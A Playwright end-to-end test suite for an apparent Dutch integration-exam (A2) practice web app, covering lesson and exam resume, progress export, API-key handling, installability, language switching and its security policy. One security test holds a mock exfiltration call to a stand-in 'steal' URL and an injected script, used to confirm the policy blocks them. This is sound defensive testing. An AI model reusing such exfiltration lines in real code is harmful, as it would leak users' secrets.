import { expect, test } from "@playwright/test";
import { answerOne, openMenu, startFresh } from "./helpers";

test("first visit: welcome screen once, then the dashboard with all modules", async ({ page }) => {
  await startFresh(page);
  for (const name of ["Basis Nederlands", "Lezen A2", "Luisteren A2", "Kennis van de Nederlandse Maatschappij", "Schrijven A2", "Proefexamens"]) {
    await expect(page.getByRole("heading", { name })).toBeVisible();
  }
  await expect(page.getByText("Niet van DUO")).toBeVisible();
  await page.goto("/"); // second visit: no landing page, no welcome screen
  await expect(page.getByRole("heading", { name: /Welkom terug/ })).toBeVisible();
  await expect(page.getByRole("heading", { name: "Free inburgering practice exam (A2)" })).toBeHidden();
});

test("a learner from before the landing page goes straight into the app at /", async ({ page }) => {
  // started on the old version: welcome seen, but no landing-page key on this device yet
  await startFresh(page);
  await page.evaluate(() => localStorage.removeItem("appStarted"));
  await page.goto("/");
  await expect(page.getByRole("heading", { name: /Welkom terug/ })).toBeVisible();
  await expect(page.getByRole("heading", { name: "Free inburgering practice exam (A2)" })).toBeHidden();
  await page.goto("/"); // and from now on without even a glimpse of the landing page
  await expect(page.getByRole("heading", { name: "Free inburgering practice exam (A2)" })).toBeHidden();
});

test("a first visit to an app page opens the app, not the landing page", async ({ page }) => {
  await page.goto("/woorden");
  await expect(page.getByRole("heading", { name: "Free inburgering practice exam (A2)" })).toBeHidden();
  await expect(page).toHaveURL(/\/woorden$/);
});

test("a lesson resumes at the same step after a refresh", async ({ page }) => {
  await startFresh(page);
  await page.goto("/unit/basis-tijd");
  await expect(page.getByText("1 / 31")).toBeVisible();
  await page.getByRole("button", { name: /Volgende/ }).click(); // lesson → first question
  await answerOne(page);
  await expect(page.getByText("3 / 31")).toBeVisible();
  await page.waitForTimeout(500); // the step is saved in the background

  await page.reload();
  await expect(page.getByText("Je gaat verder bij stap 3.")).toBeVisible();
  await expect(page.getByText("3 / 31")).toBeVisible();
  await page.goto("/");
  await expect(page.getByRole("link", { name: /Verder waar ik was/ })).toBeVisible();
});

test("a mock exam resumes with answers, position and timer, and can be handed in", async ({ page }) => {
  await startFresh(page);
  await page.goto("/examen/exam-knm-1");
  await expect(page.getByText(/vraag 1 van 40/i)).toBeVisible();
  await page.keyboard.press("1");
  await page.getByRole("button", { name: /Volgende/ }).click();
  await page.keyboard.press("2");
  await page.getByRole("button", { name: /Volgende/ }).click();
  await expect(page.getByText(/vraag 3 van 40/i)).toBeVisible();
  await expect(page.getByRole("button", { name: "Vraag 2: beantwoord" })).toBeVisible();
  await page.waitForTimeout(700); // autosave

  await page.reload();
  await expect(page.getByText(/vraag 3 van 40/i)).toBeVisible();
  await expect(page.getByRole("button", { name: "Vraag 1: beantwoord" })).toBeVisible();
  await expect(page.getByRole("button", { name: "Vraag 2: beantwoord" })).toBeVisible();
  await expect(page.getByRole("timer")).toContainText(/44:|45:00/);

  await page.getByRole("button", { name: "Inleveren" }).click();
  await expect(page.getByRole("dialog")).toContainText("38 onderdelen zijn nog niet");
  await page.getByRole("button", { name: "Ja, inleveren" }).click();
  await expect(page.getByRole("heading", { name: "Proefexamen KNM 1" })).toBeVisible();
  await expect(page.getByText(/van 40/).first()).toBeVisible();
  await expect(page.getByText("Score per thema")).toBeVisible();
});

test("progress moves to another device with a file (save → fresh browser → merge)", async ({ page, browser }, testInfo) => {
  await startFresh(page);
  await page.addInitScript(() => Object.defineProperty(navigator, "share", { value: undefined })); // force a download
  await page.goto("/unit/basis-tijd");
  await page.getByRole("button", { name: /Volgende/ }).click();
  await answerOne(page);
  await answerOne(page);
  await page.waitForTimeout(500);

  await openMenu(page);
  await page.getByRole("button", { name: /Klaar voor vandaag/ }).last().click();
  await expect(page.getByRole("dialog")).toContainText("Klaar voor vandaag");
  await page.getByLabel("Naam van dit apparaat").fill("Laptop");
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("button", { name: /Bewaar voortgang/ }).click();
  const download = await downloadPromise;
  expect(download.suggestedFilename()).toMatch(/^inburgering-a2-voortgang-\d{4}-\d{2}-\d{2}-laptop\.json$/);
  const file = testInfo.outputPath("voortgang.json");
  await download.saveAs(file);
  await expect(page.getByRole("dialog")).toContainText("Bewaard");

  // "the phone": a fresh browser profile with nothing in it
  const phone = await browser.newContext({ ...testInfo.project.use });
  const p = await phone.newPage();
  await p.goto("/welkom");
  await expect(p.getByRole("heading", { name: "Welkom bij Inburgering A2" })).toBeVisible();
  await p.setInputFiles('input[type="file"]', file);
  await expect(p.getByText("van Laptop")).toBeVisible();
  await expect(p.getByText(/antwoorden/).first()).toBeVisible();
  await p.getByRole("button", { name: "Samenvoegen" }).click();
  await expect(p.getByRole("heading", { name: /Welkom terug/ })).toBeVisible();
  await expect(p.getByRole("link", { name: /Verder waar ik was/ })).toBeVisible();

  // importing the same file again changes nothing
  await p.goto("/instellingen");
  await p.setInputFiles('input[type="file"]', file);
  await expect(p.getByText("Hier staat niets nieuws in")).toBeVisible();
  await phone.close();
});

test("the API key is validated, sent only to Anthropic, shown masked, and can be removed", async ({ page }) => {
  await startFresh(page);
  const seen: { url: string; key: string | undefined; origin: string | undefined }[] = [];
  await page.route("**/*", (route) => {
    const url = route.request().url();
    if (!url.startsWith("http://localhost:4173") && !url.startsWith("data:")) {
      seen.push({ url, key: route.request().headers()["x-api-key"], origin: undefined });
      const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "*" };
      if (route.request().method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
      return route.fulfill({ status: 401, headers: { ...cors, "content-type": "application/json" }, body: JSON.stringify({ type: "error", error: { type: "authentication_error", message: "invalid x-api-key" } }) });
    }
    return route.continue();
  });

  await page.goto("/instellingen");
  await page.getByLabel(/Plak je sleutel/).fill("hallo");
  await page.getByRole("button", { name: "Opslaan en testen" }).click();
  await expect(page.getByRole("alert")).toContainText("Dit lijkt geen Anthropic-sleutel");

  const fake = "sk-ant-api03-NIETECHTNIETECHTNIETECHT-TEST";
  await page.getByLabel(/Plak je sleutel/).fill(fake);
  await page.getByRole("button", { name: "Opslaan en testen" }).click();
  await expect(page.getByText("sk-ant-…TEST")).toBeVisible();
  await expect(page.getByText("De API-sleutel klopt niet.")).toBeVisible();
  expect(seen.length).toBeGreaterThan(0);
  expect(seen.every((r) => r.url.startsWith("https://api.anthropic.com/"))).toBe(true); // nothing else was contacted
  expect(seen.some((r) => r.key === fake)).toBe(true);

  // the key is stored encrypted, never as plain text
  const plain = await page.evaluate(async () => {
    const db: IDBDatabase = await new Promise((res) => Object.assign(indexedDB.open("inburgering-a2-secrets"), { onsuccess() { res(this.result); } }));
    const rows: any[] = await new Promise((res) => Object.assign(db.transaction("secrets").objectStore("secrets").getAll(), { onsuccess() { res(this.result); } }));
    return JSON.stringify(rows.map((r) => ({ ...r, data: Array.from(new Uint8Array(r.data)) }))).includes("NIETECHT");
  });
  expect(plain).toBe(false);

  await page.getByRole("button", { name: "Sleutel verwijderen" }).click();
  await page.getByRole("button", { name: "Ja, verwijderen" }).click();
  await expect(page.getByText("geen sleutel ingesteld")).toBeVisible();
});

test("the app is installable: manifest and service worker are in place", async ({ page }) => {
  await startFresh(page);
  const info = await page.evaluate(async () => {
    const reg = await navigator.serviceWorker.ready;
    const href = document.querySelector<HTMLLinkElement>('link[rel="manifest"]')?.href;
    const manifest = href ? await (await fetch(href)).json() : null;
    return { scope: reg.scope, name: manifest?.name, display: manifest?.display, icons: manifest?.icons?.length };
  });
  expect(info).toMatchObject({ name: "Inburgering A2", display: "standalone", icons: 3 });
  expect(info.scope).toContain("localhost:4173");
});

test("the security policy is on and nothing in the app breaks it", async ({ page }) => {
  const violations: string[] = [];
  await page.addInitScript(() => {
    (window as any).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(`${e.violatedDirective}: ${e.blockedURI}`));
  });
  const response = await page.goto("/");
  const csp = response?.headers()["content-security-policy"] ?? "";
  expect(csp).toContain("script-src 'self'");
  expect(csp).toContain("connect-src 'self' https://api.anthropic.com");
  expect(csp).not.toContain("unsafe-eval");
  expect(response?.headers()["x-content-type-options"]).toBe("nosniff");

  await startFresh(page);
  const visit = async (path: string) => {
    await page.goto(path);
    await page.waitForTimeout(400);
    violations.push(...(await page.evaluate(() => (window as any).__csp as string[])));
  };
  // lesson + exercise (markdown with v-html), words, samenvatting, exam, writing task, settings, about, progress dialog
  await page.goto("/unit/basis-tijd");
  await page.getByRole("button", { name: /Volgende/ }).click();
  await answerOne(page);
  violations.push(...(await page.evaluate(() => (window as any).__csp as string[])));
  for (const p of ["/woorden", "/woorden/herhalen", "/werkwoorden", "/samenvatting", "/examens", "/examen/exam-lezen-1", "/unit/schrijven-kort-bericht", "/instellingen", "/over", "/schrijven/geschiedenis"]) await visit(p);
  expect(violations).toEqual([]);
});

test("the policy really blocks data leaving to any other site (and inline scripts)", async ({ page }) => {
  await page.addInitScript(() => {
    (window as any).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as any).__csp.push(e.violatedDirective));
  });
  await startFresh(page);
  const result = await page.evaluate(async () => {
    const fetched = await fetch("https://example.com/steal?key=x").then(() => "sent", () => "blocked");
    const script = document.createElement("script");
    script.textContent = "window.__injected = true";
    document.head.appendChild(script);
    await new Promise((r) => setTimeout(r, 200));
    const img = new Image();
    img.src = "https://example.com/pixel.png";
    await new Promise((r) => setTimeout(r, 200));
    return { fetched, injectedRan: (window as any).__injected === true, violations: (window as any).__csp as string[] };
  });
  expect(result.fetched).toBe("blocked");
  expect(result.injectedRan).toBe(false);
  expect(result.violations).toEqual(expect.arrayContaining(["connect-src", "script-src-elem", "img-src"]));
});

test("a first visit to the landing page downloads none of the app", async ({ page }) => {
  const loaded: string[] = [];
  page.on("request", (r) => loaded.push(new URL(r.url()).pathname));
  await page.goto("/");
  await expect(page.getByRole("heading", { level: 1, name: "Free inburgering practice exam (A2)" })).toBeVisible();
  await page.waitForTimeout(1500);
  const scripts = loaded.filter((p) => p.endsWith(".js"));
  // boot.js and the tiny entry; not the app, the course, the pictures or the offline copy
  expect(scripts.filter((p) => p !== "/boot.js"), scripts.join(", ")).toHaveLength(1);
  expect(loaded.filter((p) => /course-data|\.webp$|\/sw\.js$/.test(p))).toEqual([]);
  expect(await page.evaluate(async () => (await navigator.serviceWorker.getRegistrations()).length)).toBe(0);
  // the FAQ: the first answer is open, the others open with a tap
  await expect(page.getByText("No. Train for Inburgering is not part of DUO.")).toBeVisible();
  await expect(page.getByText("Yes. There is no account, no paywall")).toBeHidden();
  await page.getByText("Is it really free?").click();
  await expect(page.getByText("Yes. There is no account, no paywall")).toBeVisible();
  // and the start link still opens the app
  await page.getByRole("link", { name: "Start practising, it's free" }).first().click();
  await expect(page.getByRole("heading", { name: "Welkom bij Inburgering A2" })).toBeVisible();
});

test("the guides open from the landing page, also once the app is installed for offline use", async ({ page }) => {
  const violations: string[] = [];
  await page.addInitScript(() => document.addEventListener("securitypolicyviolation", (e) => console.error(`CSP ${e.violatedDirective}`)));
  page.on("console", (m) => m.type() === "error" && violations.push(m.text()));
  await page.goto("/");
  // the whole card opens the guide, the picture too (a tap where a person would tap, not on the link element)
  const icon = page.locator(".site-card-link", { hasText: "How to book your inburgering exam at DUO" }).locator(".site-guide-icon");
  await icon.scrollIntoViewIfNeeded();
  const picture = await icon.boundingBox();
  await page.mouse.click(picture!.x + picture!.width / 2, picture!.y + picture!.height / 2);
  await expect(page).toHaveURL(/\/guides\/book-inburgering-exam\/$/);
  await expect(page.getByRole("heading", { level: 1, name: "How to book your inburgering exam at DUO" })).toBeVisible();
  await expect(page.getByText(/Last checked: .*This is an unofficial guide/)).toBeVisible();
  // DUO's own pages open in a new tab, so the guide stays open
  await page.context().route("https://www.inburgeren.nl/**", (route) => route.fulfill({ body: "DUO" })); // no real network in tests
  const popup = page.waitForEvent("popup");
  await page.getByRole("link", { name: "registration page" }).first().click();
  const duo = await popup;
  await duo.waitForLoadState();
  expect(new URL(duo.url()).host).toBe("www.inburgeren.nl");
  await duo.close();
  await expect(page).toHaveURL(/\/guides\/book-inburgering-exam\/$/);

  // a learner with the offline copy installed must still get the guide, not the app
  await startFresh(page);
  await page.evaluate(async () => await navigator.serviceWorker.ready);
  await page.reload();
  expect(await page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
  await page.goto("/guides/mijn-inburgering-login/");
  await expect(page.getByRole("heading", { level: 1, name: "How to log in to Mijn Inburgering" })).toBeVisible();
  await page.goto("/guides/");
  await expect(page.getByRole("heading", { level: 1, name: "Guides to the inburgering process" })).toBeVisible();
  await page.goto("/nl/");
  await expect(page.getByRole("heading", { level: 1, name: "Gratis oefenexamen inburgering (A2)" })).toBeVisible();
  // the app's "Home page" link: the landing page, also for a learner who has started; its start link goes back
  await page.goto("/landing/");
  await expect(page.getByRole("heading", { level: 1, name: "Free inburgering practice exam (A2)" })).toBeVisible();
  await page.getByRole("link", { name: "Start practising, it's free" }).first().click();
  await expect(page).toHaveURL(/\/$/);
  await expect(page.locator("#landing")).toBeHidden();
  expect(violations).toEqual([]);
});

test("the guides are in the language of the landing page, and the language menu switches the same guide", async ({ page }) => {
  await page.goto("/es/");
  await page.getByRole("link", { name: "Cómo reservar tu examen de inburgering en DUO" }).click();
  await expect(page).toHaveURL(/\/es\/guides\/book-inburgering-exam\/$/);
  await expect(page.locator("html")).toHaveAttribute("lang", "es");
  await expect(page.getByText(/Última revisión: .*Esta guía no es oficial/)).toBeVisible();
  // a link inside the guide stays in Spanish
  await page.getByRole("link", { name: "Entra en Mijn Inburgering" }).click();
  await expect(page).toHaveURL(/\/es\/guides\/mijn-inburgering-login\/$/);

  await page.locator(".site-lang summary").click();
  await page.getByRole("link", { name: "Nederlands" }).click();
  await expect(page).toHaveURL(/\/nl\/guides\/mijn-inburgering-login\/$/);
  await expect(page.getByRole("heading", { level: 1, name: "Zo log je in op Mijn Inburgering" })).toBeVisible();
  // the start link opens the app with Dutch chosen
  await page.getByRole("link", { name: "Begin met oefenen, het is gratis" }).first().click();
  await expect(page.getByRole("radio", { name: "Nederlands" })).toHaveAttribute("aria-checked", "true");
});

test("the language menu goes to the landing page in that language, and its start link opens the app in it", async ({ page }) => {
  await page.goto("/");
  await page.locator(".site-lang summary").click();
  await page.getByRole("link", { name: "Nederlands" }).click();
  await expect(page).toHaveURL(/\/nl\/$/);
  await expect(page.getByRole("heading", { level: 1, name: "Gratis oefenexamen inburgering (A2)" })).toBeVisible();
  await expect(page.locator("html")).toHaveAttribute("lang", "nl");

  await page.locator(".site-lang summary").click();
  await page.getByRole("link", { name: "Español" }).click();
  await expect(page).toHaveURL(/\/es\/$/);
  await expect(page.getByRole("heading", { level: 1, name: "Examen de práctica de inburgering gratis (A2)" })).toBeVisible();

  // a narrow phone: the header (name and menu) fits, nothing scrolls sideways
  await page.setViewportSize({ width: 320, height: 640 });
  for (const path of ["/", "/nl/", "/es/"]) {
    await page.goto(path);
    expect(await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth), `${path} scrolls sideways`).toBeLessThanOrEqual(0);
  }

  // the Spanish start link opens the app with Spanish chosen, and the address loses ?lang=
  await page.getByRole("link", { name: "Empieza a practicar, es gratis" }).first().click();
  await expect(page.getByRole("radio", { name: "Español" })).toHaveAttribute("aria-checked", "true");
  expect(page.url()).not.toContain("lang=");
});
